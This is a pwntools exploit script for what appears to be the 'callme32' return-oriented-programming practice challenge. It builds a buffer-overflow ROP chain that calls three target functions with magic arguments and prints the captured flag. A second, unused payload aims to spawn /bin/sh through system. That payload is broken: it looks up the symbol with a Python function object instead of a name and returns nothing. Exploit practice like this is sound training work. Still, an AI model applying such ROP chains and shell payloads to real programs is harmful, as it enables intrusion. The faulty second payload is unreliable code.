from platform import system
from pwn import *

BINARY = "./callme32"
ELF = ELF(BINARY)

context.os = "linux"
context.arch = "i386"
context.binary = BINARY

p = process(BINARY)

def payload_1():
    rop = b"A" * 44
    for func in ['callme_one', 'callme_two', 'callme_three']:
        rop += p32(ELF.symbols[func])
        rop += p32(0x080487f9) # pop 3 times ret;
        rop += p32(0xdeadbeef)
        rop += p32(0xcafebabe)
        rop += p32(0xd00df00d) 
    return rop

def payload_2():
    rop = b"A" * 44
    rop += p32(ELF.symbols[system])
    rop += b"BBBB"
    rop += b"/bin/sh\x00"

PAYLOAD = 1
SLICE = 2
rop = payload_1()

if PAYLOAD == 2:
    rop = payload_2()
    SLICE = 6



log.success(f"ROPchain = {rop}")
p.sendline(rop)
flag = p.recvall().split(b'\n')[-SLICE]
log.success(f"FLAG : {flag}")

with open('./input', mode='wb') as f:
    f.write(rop)
